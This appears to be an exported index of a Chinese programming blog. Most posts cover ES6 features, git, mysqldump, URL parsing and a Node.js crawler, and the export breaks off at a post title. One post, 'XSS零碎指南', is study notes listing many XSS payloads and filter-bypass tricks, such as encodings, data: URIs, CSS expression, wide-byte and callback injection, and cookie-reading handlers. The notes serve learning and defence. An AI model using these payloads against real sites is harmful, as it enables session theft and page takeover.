&#123;console.log(i)&#125;// 2 3 4 5 其遍历也是使用 val of values，他没有继承 Array 的方法，自己的几个方法是：size()：返回成员总数。add(value)：添加某个值。delete(value)：删除某个值。has(value)：返回一个布尔值，表示该值是否为set的成员。clear()：清除所有成员。转化为数组的方式： 12var items = new Set([1, 2, 3, 4, 5]);var array = Array.from(items); 2. Map Map 是一个\超对象”，其 key 除了可以是 String 类型之外，还可以为其他类型（如：对象） 12345678var m = new Map();o = &#123;p: &quot;Hello World&quot;&#125;;m.set(o, &quot;content&quot;)console.log(m.get(o))// &quot;content&quot; 他的方法和 Set 差不多：size：返回成员总数。set(key, value)：设置一个键值对。get(key)：读取一个键。has(key)：返回一个布尔值，表示某个键是否在Map数据结构中。delete(key)：删除某个键。clear()：清除所有成员。keys()：返回键名的遍历器。values()：返回键值的遍历器。entries()：返回所有成员的遍历器。3. WeakMap如果说Map 是一个\超对象”，那 WeakMap 就是个 \弱超对象”，他的键值只能是除 null 以外的对象。他的存在是为了方便垃圾回收。八、遍历器（Iterator）相比 Array，他对数据的管理更为紧凑，而且可操纵性也比较强，以后会成为一个比较通用的 JS 工具。 123456789101112131415function idMaker()&#123; var index = 0; return &#123; next: function()&#123; return &#123;value: index++, done: false&#125;; &#125; &#125;&#125;var it = idMaker();it.next().value // &apos;0&apos;it.next().value // &apos;1&apos;it.next().value // &apos;2&apos; 一个对象只要具备了next方法，就可以用for…of循环遍历它的值。 12345for (var n of it) &#123; if (n &gt; 5) break; console.log(n);&#125; 九、Generator 函数 Generator就是一个改装了的 Iterator 遍历器，通过 yield 来增加一个 next() 节点。声明一个 Generator 的方法： 123function * foo( input ) &#123; var res = yield input;&#125; 使用方式： 1234567function * foo( input ) &#123; var res = yield input;&#125;var g = foo(10);g.next(); // &#123; value: 10, done: false &#125;g.next(); // &#123; value: undefined, done: true &#125; Genrator的标识就是函数名前面有个 * 号，由于每个 yield 都会增加一个 next() 节点，当我们在一个 Generator 中添加多个 yield 的时候： 12345678910function* G() &#123; yield &apos;Barret&apos;; yield &apos;Lee&apos;;&#125;var g = G();g.next(); // &quot;Barret&quot;g.next(); // &quot;Lee&quot;g.next(); // undefinedg.next(); // Error: Generator has already finished 相比 Iterator，我更喜欢 Generator。十、Promise 对象ES6将 Promise 纳入规范之后，很多浏览器根据 Promise/A+ 规范实现了一套 API，Promise对象是对异步操作的平坦式表达，避免了 callback hell，也就是多层嵌套的回调函数。这方面的东西可以参考我之前写的 JavaScript异步编程原理.这里是 Promise/A+ 规范文档，感兴趣的可以阅读一下。在Promises/A规范中，每个任务都有三种状态：默认(pending)、完成(fulfilled)、失败(rejected)。默认状态可以单向转移到完成状态，这个过程叫resolve，对应的方法是deferred.resolve(promiseOrValue)；默认状态还可以单向转移到失败状态，这个过程叫reject，对应的方法是deferred.reject(reason)；默认状态时，还可以通过deferred.notify(update)来宣告任务执行信息，如执行进度；状态的转移是一次性的，一旦任务由初始的pending转为其他状态，就会进入到下一个任务的执行过程中。十一、Class和Module1. ClassClass，对象模板： 123456789101112class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return &apos;(&apos;+this.x+&apos;, &apos;+this.y+&apos;)&apos;; &#125;&#125; 一下子就有了 C++/Java 的感觉了，在类中可以使用 extends 继承： 123456789101112class ColorPoint extends Point &#123; constructor(x, y, color) &#123; super(x, y); // same as super.constructor(x, y) this.color = color; &#125; toString() &#123; return this.color+&apos; &apos;+super(); &#125;&#125; 2. Module 之前在这篇文章谈过模块化编程的必要性，时代在变化，需求也在变，ES6引入 Module 也算是与时俱进。ES6允许将独立的js文件作为模块，也就是说，允许一个JavaScript脚本文件调用另一个脚本文件，从而使得模块化编程成为可能。 123456789// circle.jsexport function area(radius) &#123; return Math.PI * radius * radius;&#125;export function circumference(radius) &#123; return 2 * Math.PI * radius;&#125; 如果我们要引入 circle.js 的函数，可以： 123456// main.jsimport &#123; area, circumference &#125; from &apos;circle&apos;;console.log(&quot;圆面积：&quot; + area(4));console.log(&quot;圆周长：&quot; + circumference(14)); 如果要引入整个 circle 的内容： 123456// main.jsmodule circle from &apos;circle&apos;;console.log(&quot;圆面积：&quot; + circle.area(4));console.log(&quot;圆周长：&quot; + circle.circumference(14)); 模块之间的继承使用这条命令： 12// other.jsexport * from &apos;circle&apos;; 这个东西，很好用，可惜了，纯洁的 JS，被糟蹋成啥样了=. = 十二、感谢 本文的书写逻辑参考阮一峰的总结，并参入了一些个人主观色彩，感谢前人栽树！ 十三、参考资料 http://es6.ruanyifeng.com/ 阮一峰http://www.web-tinker.com/article/20558.html http://www.web-tinker.com/article/20468.htmlhttp://www.web-tinker.com/article/20520.html 次碳酸钴http://huangj.in/765 H-Jin]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS零碎指南]]></title>
    <url>%2Fblog%2F2014%2F05%2F01%2F2014-05-01-cb-xss-snippets%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 该文章是本人两天的学习笔记，共享出来，跟大家交流。知识比较零散，但是对有一定 JS 基础的人来说，每个小知识都有助于开阔你的 Hack 视角。首先声明，本文只是 XSS 攻击的冰山一角，读者自行深入研究。一、XSS学习提要http://qdemo.sinaapp.com/ppt/xss/ 三水清 简单介绍 xsshttp://drops.wooyun.org/tips/689 乌云 xss与字符编码http://www.wooyun.org/whitehats/心伤的瘦子 系列教程http://ha.ckers.org/xss.html 反射性XSS详细分析和解释http://html5sec.org/ 各种技巧 ★★★★★http://www.80sec.com/ 一些不错的文章二、XSS攻击要点注意：这些插入和修改都是为了避开浏览器自身的过滤，或者开发者认为的过滤。1. JS函数。document.write innerHTML eval setTimeout/setInterval等等都是很多XSS攻击注入的入口2. html实体编码 123456789&gt; &quot;alert(&quot;Barret李靖&quot;)&quot;.replace(/./g, function(s)&#123; return &quot;&lt;#&quot; + s.charCodeAt(0) /*.toString(16) 转换成16进制也可以滴*/ + &quot;;&quot; &#125;);&gt; &quot;&lt;#97;&lt;#108;&lt;#101;&lt;#114;&lt;#116;&lt;#40;&lt;#49;&lt;#41;&quot;&lt;img src=&quot;x&quot; onerror=&quot;&lt;#97;&lt;#108;&lt;#101;&lt;#114;&lt;#116;&lt;#40;&lt;#49;&lt;#41;&quot;&gt; 3. 如果过滤 html 实体编码，可以改成URL编码 12&gt; encodeURIComponent(&quot;&lt;#&quot;)&gt; &quot;%26%23&quot; 4. 利用 HTML5 新增字符 1234&lt;colon; 冒号&lt;NewLine; 换行&lt;a href=&quot;javascr&lt;NewLine;ipt&lt;colon;alert(&quot; barret李靖&quot;)&quot;=&quot;&quot;&gt;XSS&lt;/a&gt; 5. JS进制转换 12&gt; &quot;\74\163\143\162\151\160\164\76\141\154\145\162\164\50\61\51\74\57\163\143\162\151\160\164\76&quot;&gt; &quot;&lt;script&gt;alert(&quot;Barret李靖&quot;)&lt;/script&gt;&quot; 6. Base64转换 1234&gt; base64(&quot;&lt;script&gt;alert(&quot;Barret李靖&quot;)&lt;/script&gt;&quot;);&gt; PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;XSS&lt;/a&gt; 7. 浏览器解析非严格性 123&lt;img src=&quot;image.jpg&quot; title=&quot;Hello World&quot; class=&quot;test&quot;&gt; ↓ ↓ ↓ ↓ ↓ ↓ ①② ③ ④ ⑤ ⑥ ①中可插入 NUL字符（0x00）②和④中空格可以使用 tab（0x0B）与换页键（0x0C），②还可以使用 / 替换⑤中的”在IE中也可替换成`。 123456789 位置 | 代码 | 可能插入或替代的代码------------|---------------------------|-----------------------&lt;的右边 |=&quot;&quot; &lt;[here]a=&quot;&quot; href=&quot;... | 控制符，空白符，非打印字符a标签的后门 | &lt;a[here]href=&quot; ...=&quot;&quot; 同上=&quot;&quot; href属性中间=&quot;&quot; &lt;a=&quot;&quot; hr[here]ef=&quot;... | 同上+空字节=两边 | &lt;a href[here]=[here]&quot; 所有字符=&quot;&quot; 替换=&quot;|&quot; href[here]&quot;...=&quot;&quot; union编码符号=&quot;&quot; 替换&quot;=&quot;&quot;&gt; | 其他引号&gt;之前 | &lt;a href=&quot;...&quot; [here]=&quot;&quot;&gt; | 任意字符/之前 | &lt;a href=&quot;...&quot;&gt;...&lt;[here] a=&quot;&quot;&gt; | 空白符，控制符/之后 | &lt;a href=&quot;...&quot;&gt;... | 空白符，控制符&gt;闭合之前 | &lt;a href=&quot;...&quot;&gt;... | 所有字符 &lt;/[here]&gt;&lt;/的右边&gt; 8. 斜杠在字符串中斜杠（/）可以用于转义字符，比如转义 “ 和 ‘ ，双斜杠（//）可以用来注释。这样可以很轻松的改变之前的语句，注入内容。9. 空格的处理方式在解析的时候空格被转移成 &lt;nbsp;,注入的时候可以使用 /**/来替换。10. 特殊属性1）srcdoc属性（chrome有效） 1&lt;iframe srcdoc=&quot;&lt;lt;script&lt;gt;alert(&quot; barret李靖&quot;)&lt;lt;=&quot;&quot; script&lt;gt;&quot;=&quot;&quot;&gt;&lt;/iframe&gt; 2）autofoucus 1&lt;input onfocus=&quot;write(1)&quot; autofocus&gt; 3）object 123&lt;object classid=&quot;clsid:333c7bc4-460f-11d0-bc04-0080c7055a83&quot;&gt; &lt;param name=&quot;dataurl&quot; value=&quot;javascript:alert(&quot; barret李靖&quot;)&quot;=&quot;&quot;&gt;&lt;/object&gt; 11.绕过浏览器过滤（crhome） 12?t=&quot;&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(&quot;Barret李靖&quot;)&quot;&gt;&lt;input type=&quot;hidden&quot; id=&quot;sClientUin&quot; value=&quot;&quot;&gt; 浏览器会过滤onerror中的代码，所以换种方式注入 1?t=&quot;&gt;&lt;script src=&quot;data:text/html,&lt;script&gt;alert(&quot; barret李靖&quot;)&lt;=&quot;&quot; script=&quot;&quot;&gt;&lt;!-- chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截。12.替换URL 123&lt;xss&gt;&lt;style&gt;.xss&#123;background-image:url(&quot;javascript:alert(&apos;xss&apos;)&quot;);&#125;&lt;/style&gt;&lt;a class=&quot;xss&quot;&gt;&lt;/a&gt;&lt;style type=&quot;text/css&quot;&gt;body&#123;background:url(&quot;javascript:alert(&apos;xss&apos;)&quot;)&#125;&lt;/style&gt; 13.抓包、换包 三、XSS攻击方式 1. javascript:和vbscript:协议执行后的结果将会映射在DOM后面。 1&lt;a href=&quot;javascript:&apos;\x3cimg src\x3dx onerror=alert(&quot; barret李靖&quot;)=&quot;&quot;&gt;&apos;&quot;&gt;click me&lt;/a&gt; 2. 变量覆盖 12&lt;form id=&quot;location&quot; href=&quot;bar&quot;&gt;&lt;script&gt;alert(location.href)&lt;/script&gt; 3. meta标签 123&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=javascript:alert(document.domain)&quot;&gt;Javascript: 协议可能被禁止，可以使用 data:&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=data:text/html,&lt;script&gt;alert(&quot; barret李靖&quot;)&lt;=&quot;&quot; script=&quot;&quot;&gt;&quot;&gt; 4. css注入 1234567&lt;style&gt;@import &quot;data:,*%7bx:expression(write(1))%7D&quot;;&lt;/style&gt;&lt;style&gt;@imp\ ort&quot;data:,*%7b- = \a %65x\pr\65 ssion(write(2))%7d&quot;; &lt;/style&gt;&lt;style&gt;&lt;link rel=&quot;Stylesheet&quot; href=&quot;data:,*%7bx:expression(write(3))%7d&quot;&gt; 5. 提前闭合标签 1234567891011121314http://example.com/test.php?callback=cb缺陷代码：&lt;script type=&quot;text/javascript&quot;&gt; document.domain=&apos;soso.com&apos;; _ret=&#123;&quot;_res&quot;:2&#125;; try&#123; parent.aaa(_ret); &#125;catch(err)&#123; aaa(_ret); &#125;&lt;/script&gt;注入：http://example.com/test.php?callback=cb&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt; 原理：cb为回调函数，如果后端并没有对callback字段进行过滤，则可以cb&lt;/script&gt;&lt;script&gt;alert(“XSS”)&lt;/script&gt;这么长的一串作为函数名，然后你就懂啦~ 本方式只针对上面有缺陷的代码。6. 提前闭合双引号 123456&lt;input type=&quot;text&quot; value=&quot;XSS&lt;quot; onclick=&lt;quot;alert(&quot; barret李靖&quot;)&quot;=&quot;&quot;&gt;&lt;!--&lt;img src=&quot;--&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(&quot;Barret李靖&quot;)//&quot;&quot;&gt;&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(&quot; barret李靖&quot;)=&quot;&quot; &quot;=&quot;&quot;&gt;&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=alert(&quot; barret李靖&quot;)=&quot;&quot; &quot;=&quot;&quot;&gt;&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(&quot;Barret李靖&quot;)//&quot;&quot;&gt; 7. 阻止编码 1234?t=;alert(&quot;Barret李靖&quot;)&lt;script type=&quot;text/javascript&quot;&gt; var t = query(t); // t = &quot;&lt;quot;;alert(&quot;Barret李靖&quot;)&quot;&lt;/script&gt; 上面可以看到 “;” 被编码了，观察页面编码： 1&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb18030&quot;&gt; gbxxx系列编码，可以尝试宽字节： 1?t=%c0%22alert(&quot;Barret李靖&quot;) 8. 攻击单行注释URL对应的param中添加换行符（%0a）或者其他换行符。 12345678?t=%0aalert(&quot;Barret李靖&quot;)//// init(&apos;id&apos;, &quot;%0aalert(&quot;Barret李靖&quot;)//&quot;);被解析成// init(&apos;id&apos;, &quot;alert(&quot;Barret李靖&quot;)//&quot;); 9. urlurl中可以使用很多协议 http:// // javascript: vbscript: data:等等，利用这些属性，可以找到很多的空隙。 1&lt;a href=&quot;data:text/html,&lt;script&gt;alert(&quot; barret李靖&quot;)&lt;=&quot;&quot; script=&quot;&quot;&gt;&quot;&gt;XSS&lt;/a&gt; 10. Flash跨域注入这个我不太熟悉，现在网页上Flash用的越来越少了，懒得继续看了。11. 利用事件 1&lt;iframe src=&quot;#&quot; onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt; 12. 利用标签 1&lt;table&gt;&lt;td background=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt; 四、XSS攻击实质 XSS攻击没太多神奇的地方，就是利用浏览器防御不周到或者开发者代码不健壮，悄悄对页面或者服务器进行攻击。1. 绕过过滤URL中的 &lt;，在DOM XSS中，可以使用 \u003c (unicode编码)表示，不过他有可能被过滤了，最后解析成&lt;lt;，也可以使用 \x3c (Javascript 16进制编码)，&gt; 对应使用 \x3e。这种情况经常在 innerHTML 以及 document.write 中用到。所谓的过滤包括人工过滤，也包括了浏览器HTML与JavaScript本身的过滤，程序员会在浏览器本身过滤过程中进行一些干扰和修改，这几个流程都给我们提供了很多 xss 攻击的入口。1) 数据需要过滤，但是未过滤。导致XSS。比如：昵称、个人资料。2) 业务需求使得数据只能部分过滤，但过滤规则不完善，被绕过后导致XSS。比如：日志、邮件及其它富文本应用。2. 利用源码中js的解析比如第二部分提出的第11点，浏览器的拦截 1?t=&quot;&gt;&lt;script&gt;alert(&quot;Barret李靖&quot;)&lt;/script&gt; 这样的插入会被拦截，当你发现源码中有这么一句话的时候： 12345function parseURL()&#123; //... t.replace(&quot;WOW&quot;, &quot;&quot;); //..&#125; 便可以修改如上参数： 1?t=&quot;&gt;&lt;scrwowipt&gt;alert(&quot;Barret李靖&quot;)&lt;/scrwowipt&gt; 直接绕过了chrome浏览器对危险代码的防御。 五、学会XSS攻击 1. 寻找可控参数 攻击入口在哪里？一般是有输入的地方，比如URL、表单、交互等。 含参数的URL中找到参数 value 值的输出点，他可能在html中输入，也可能是在javascript中实验各种字符（&lt; , &gt; “ ‘等），判断是否被过滤，测试方式，手动输入测试确定可控范围，是否可以使用unicode编码绕过，是否可以使用HTML编码绕过，是否可以使用Javascript进制编码绕过等等2. 开始注入注入细节上面都是，基本的思维模式：覆盖阻断利用特性3. 修补注入错误注入后保证没有语法错误，否则代码不会执行，注入了也没用。这里的意思是，你注入的一个参数可能在脚本多处出现，你可以保证一处没语法错误，但是不能保证处处都正确4. 开搞测试的时候alert(“Barret李靖”),弹出成功再继续其他更邪恶的注入方式。六、XSS分类为什么留到后面说。XSS也了解了很多次了，每次都是先从概念触发，感觉没啥意思，什么反射性、DOM型、储存型等等，还不如先去实践下，凭着自己对XSS的理解，多看几个网站的源码，找找乐趣。存储型和反射型相比，只是多了输入存储、输出取出的过程。简单点说：反射型是：输入–输出；存储型是：输入–进入数据库*–取出数据库–输出。这样一来，大家应该注意到以下差别：反射型是：绝大部分情况下，输入在哪里，输出就在哪里。存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中。因而我们找存储型的时候，从一个地方输入数据，需要检测很多输出的点，从而可能会在很多点发现存储型XSS。七、辅助工具http://ha.ckers.org/xsscalc.htmlchrome插件 （xss Encode，百度之）抓包工具，fiddler4 chales白名单过滤工具github/js-xss八、小结简单小结：&lt; 号不应该出现在HTML的大部分节点中。括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。在ext节点里面，&lt;左尖括号有很大的危害。引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。。。。关注漏洞报告平台 Wooyun，多动脑筋，手动 hack。最重要的还是先黑客再红客。九、参考资料http://drops.wooyun.org/tips/689http://drops.wooyun.org/tips/147http://www.web-tinker.com/article/20468.htmlhttp://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90//www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>hack</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git切换到远程分支]]></title>
    <url>%2Fblog%2F2014%2F04%2F30%2F2014-04-30-switch-branch-in-git%2F</url>
    <content type="text"><![CDATA[远程仓库 git clone 下来，当你执行 git branch，你只会看到 * master 并不会看到其他分支，即便远程仓库上有其他分支，使用 git branch -va 可以查看本地+远程分支列表 * master 0840594 merge master and 1.0.0 remotes/origin/1.0.0 743012a &apos;update&apos; remotes/origin/2.0.0 2787838 udpate remotes/origin/HEAD -&gt; origin/master remotes/origin/master 0840594 merge master and 1.0.0 如果想切换到 origin/2.0.0 的分支，我们可以 git branch remotes/origin/2.0.0 不过结果并不如意： * (detached from origin/2.0.0) master git branch 会看到上面的信息，这里还需要一步操作： git checkout -b 2.0.0 -b 的意思是 base，以当前分支为 base，新建一个名叫 2.0.0 的分支，这里当然也可以使用其他的命名。此时再执行 git branch 就能看到： $ git br master * 2.0.0 就 OK 了~ 最直接的方法是： git checkout -t origin/2.0.0 能够直接新建本地分支，将远程分支提取出来。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css选中前一个元素]]></title>
    <url>%2Fblog%2F2014%2F04%2F30%2F2014-04-30-previous-element-with-css%2F</url>
    <content type="text"><![CDATA[想了半天没找到 hack 的方式，CSS4 也没有提供类似的方法，不过在以后的草案中可能会出现 !previous + next {} 这样选中上一个元素，那么就可以使用 !* + obj 来选中 obj 的前一个元素了]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysqldump的使用]]></title>
    <url>%2Fblog%2F2014%2F04%2F29%2F2014-04-29-useage-of-mysqldump%2F</url>
    <content type="text"><![CDATA[导出整个数据库mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名 mysqldump -u wcnc -p smgp_apps_wcnc &gt; wcnc.sql 导出一个表mysqldump -u 用户名 -p 数据库名 表名&gt; 导出的文件名 mysqldump -u wcnc -p smgp_apps_wcnc users&gt; wcnc_users.sql 导出一个数据库结构 mysqldump -u wcnc -p -d --add-drop-table smgp_apps_wcnc &gt;d:\wcnc_db.sql -d 没有数据 –add-drop-table 在每个create语句之前增加一个drop table 导入数据库常用source 命令进入mysql数据库控制台，如mysql -u root -p mysql&gt;use 数据库然后使用source命令，后面参数为脚本文件（如这里用到的.sql） mysql&gt;source d:\wcnc_db.sql]]></content>
      <categories>
        <category>后端杂烩</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysqldump</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解析URL到对应的Object]]></title>
    <url>%2Fblog%2F2014%2F04%2F29%2F2014-04-29-reverse-string-to-object%2F</url>
    <content type="text"><![CDATA[将 URL 中对象解析出来： var a=&apos;account.type=1&amp;account.id=&amp;account.dependFlag=0&amp;account.card.companyId=1&amp;account.name=%E4%B8%AD%E9%93%B6VISA%E5%8D%A1&amp;account.hidden=&amp;account.card.cardNo=&amp;account.moneyTypeId=0&amp;account.card.billDay=1&amp;account.card.repayType=0&amp;account.card.repayDay=20&amp;account.card.alert=2&amp;account.comment=%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D&apos;; var root={}; a.split(&apos;&amp;&apos;).sort().map(function(s){ var p=root; s.match(/(.+?)(?:\.|=)/g).map(function(ss){ var t=ss.slice(0,-1); p[t]=p[t]||((ss.slice(-1)===&apos;=&apos;)?decodeURIComponent(s.match(/=(.*)$/)[1]):{}); p=p[t]; }); }); console.log(root); 以上是网友的答案，我暂时没想到更好的算法。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>解析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NodeJS写个爬虫，把文章放到kindle中阅读]]></title>
    <url>%2Fblog%2F2014%2F04%2F28%2F2014-04-28-cb-spider-with-node%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 这两天看了好几篇不错的文章，有的时候想把好的文章 down 下来放到 kindle 上看，便写了个爬虫脚本，因为最近都在搞 node，所以就很自然的选择 node 来爬咯～本文地址：http://www.cnblogs.com/hustskyking/p/spider-with-node.html，转载请注明源地址。所谓爬虫，可以简单理解为利用程序操作文件，只是这些文件不在本地，需要我们拉取过来。一. 爬虫代码解析1. 拿到目标页码源码Node 提供了很多接口来获取远程地址代码，就拿 AlloyTeam 的页面举例吧，把他首页几篇文章的信息爬取过来。因为 AlloyTeam 使用的协议是 http:// ，本文就不介绍 Node 中 // 的使用了。 1234567891011121314151617181920212223var http = require(&quot;http&quot;);var url = &quot;http://www.alloyteam.com/&quot;;var data = &quot;&quot;;// 创建一个请求var req = http.request(url, function(res)&#123; // 设置显示编码 res.setEncoding(&quot;utf8&quot;); // 数据是 chunked 发送，意思就是一段一段发送过来的 // 我们使用 data 给他们串接起来 res.on(&apos;data&apos;, function(chunk)&#123; data += chunk; &#125;); // 响应完毕时间出发，输出 data res.on(&apos;end&apos;, function()&#123; // dealData(data); console.log(data); &#125;);&#125;);// 发送请求req.end(); 上面短短七八行代码，就拿到了 AlloyTeam 首页的代码，真的十分简单，如果是 // 就得引用 https 模块咯，都是差不多的。2. 正则提取目标内容先看下我们要抓取的内容：&nbsp;由于没有使用其他库，我们没办法像操作 DOM 一样获取目标内容，不过写正则也挺简单的，比如我们要 获取标题/文章链接/摘要 这些内容，正则表达式为： 12345678910// function dealDatavar reg = /&lt;ul\s+class=&quot;articlemenu&quot;&gt;\s+&lt;li&gt;\s+&lt;a[^&gt;]*&gt;.*?&lt;\ a=&quot;&quot;&gt;\s+&lt;a href=&quot;(.*?)&quot; [^=&quot;&quot;&gt;]*&gt;(.*?)&lt;\ a=&quot;&quot;&gt;[\s\S]*?&lt;div\s+class=&quot;text&quot;&gt;([\s\S]*?)&lt;\ div=&quot;&quot;&gt;/g;var res = [];while(match = reg.exec(data)) &#123; res.push(&#123; &quot;url&quot;: match[1], &quot;title&quot;: match[2], &quot;excerpt&quot;: match[3] &#125;);&#125; &lt;/>&lt;/div\s+class=”text”&gt;&lt;/>&lt;/>&lt;/a[^&gt;&lt;/ul\s+class=”articlemenu”&gt; 这里的正则看起来有点晦涩，不过呢，正则在编程中十分基础的东西，如果没有太多的了解，建议先去搞清楚，这里就不细说啦。这里要强调的一点是： 1reg.exec(data); 如果只写上面这句话，只会拿到第一个匹配结果，所以需要使用 while 循环来处理，没处理一次，正则匹配的位置就会往后推一下。其实上面这条语句执行后返回的是一个对象，其中包含一个 index 属性，具体可以查阅 JavaScript 正则的内容。这里返回（res）的数据格式是： 12345[&#123; &quot;url: url, &quot;title&quot;: title, &quot;excerpt&quot; excerpt&#125;]; 3. 数据的过滤 上面虽然拿到了内容，不过我们需要的是纯文本，其他标签什么的得过滤掉，excerpt 中包含了一些标签： 1var excerpt = excerpt.replace(/(&lt;.*?&gt;)((.*?)(&lt;.*?&gt;))?/g, &quot;$3&quot;); &lt;/.?&gt;&lt;/.?&gt; 虽说文章中有很多代码，有些标签是不应该删除的，不过这里是摘要内容，这些内容的标签都删除掉，方便我们储存。然后把长度处理下： 1excerpt = excerpt.slice(0, 120); 4. 存到数据库（或者文件） 我这里是把文件储存到文件之中，存放格式为： 12[title](url)&gt; excerpt 哈哈，很熟熟悉吧，markdown 语法，看起来也比较清晰。 1234var str = &quot;&quot;;for(var i = 0, len = data.length; i &lt; len; i++)&#123; str += &quot;[&quot; + data[i].title + &quot;](&quot; + data[i].url + &quot;)\n&quot; + data[i].excerpt.replace(&quot;\n\s*\n?&quot;, &quot;&gt;\n&quot;) + &quot;\n\n&quot;;&#125; 先拼接数据，然后写入到文件： 1234fs.writeFile(&apos;index.md&apos;, str, function (err) &#123; if (err) throw err; console.log(&apos;数据已保存～&apos;);&#125;); 大功告成，过程其实是很简单的。拿到的内容（Linux 下，字体真丑！）：二. 源码与小结如果对正则不太熟悉，上面的工作是不太好完成的，很多开发者为 Node 提供了工具库，使用 npm 可以安装，如果不习惯正则，使用一些工具包辅助处理，可以把拿到的数据当作 DOM 来解析。我了解到的有一个叫做 node-jquery 的库貌似还不错，具体请读者自己去网上搜吧，应该挺多的。上面的代码都是随手写的，没有做什么容错的机制，也只爬取了首页的内容，不过思路都是一样的，拿到 URL 之后再写个循环，其他页面的内容也就到手了。源码没几行： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647var http = require(&quot;http&quot;);var fs = require(&quot;fs&quot;);var url = &quot;http://www.alloyteam.com/&quot;;var data = &quot;&quot;;var req = http.request(url, function(res)&#123; res.setEncoding(&quot;utf8&quot;); res.on(&apos;data&apos;, function(chunk)&#123; data += chunk; &#125;); res.on(&apos;end&apos;, function()&#123; dealData(data); &#125;);&#125;);req.on(&apos;error&apos;, function(e)&#123; throw e;&#125;);req.end();console.log(&quot;数据下载中...&quot;);function dealData(data)&#123; var reg = /&lt;ul\s+class=&quot;articlemenu&quot;&gt;\s+&lt;li&gt;\s+&lt;a[^&gt;]*&gt;.*?&lt;\ a=&quot;&quot;&gt;\s+&lt;a href=&quot;(.*?)&quot; [^=&quot;&quot;&gt;]*&gt;(.*?)&lt;\ a=&quot;&quot;&gt;[\s\S]*?&lt;div\s+class=&quot;text&quot;&gt;([\s\S]*?)&lt;\ div=&quot;&quot;&gt;/g; var res = []; while(match = reg.exec(data)) &#123; res.push(&#123; &quot;url&quot;: match[1], &quot;title&quot;: match[2], &quot;excerpt&quot;: match[3].replace(/(&lt;.*?&gt;)((.*?)(&lt;.*?&gt;))?/g, &quot;$3&quot;).slice(0,120) &#125;); &#125; writeFile(res) &#125;function writeFile(data)&#123; var str = &quot;&quot;; for(var i = 0, len = data.length; i &lt; len; i++)&#123; str += &quot;[&quot; + data[i].title + &quot;](&quot; + data[i].url + &quot;)\n&gt;&quot; + data[i].excerpt.replace(/\n\s*\n?/g, &quot;\n&gt;&quot;) + &quot;\n\n&quot;; &#125; fs.writeFile(&apos;index.md&apos;, str, function (err) &#123; if (err) throw err; console.log(&apos;数据已保存～&apos;); &#125;);&#125; 在 node 环境中： 1node spider.js 就可以在同级目录下看到 index.md 文件了。至于如何放到 kindle 中，先了解下 OPF 格式，然后使用 Amazon 的 KindleGen 工具打包就行啦。 三. 参考资料 http://nodejs.org/api/fs.htmlhttp://nodejs.org/api/http.html]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>NodeJS</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[当正则匹配零个字符]]></title>
    <url>%2Fblog%2F2014%2F04%2F28%2F2014-04-28-reg-match-null%2F</url>
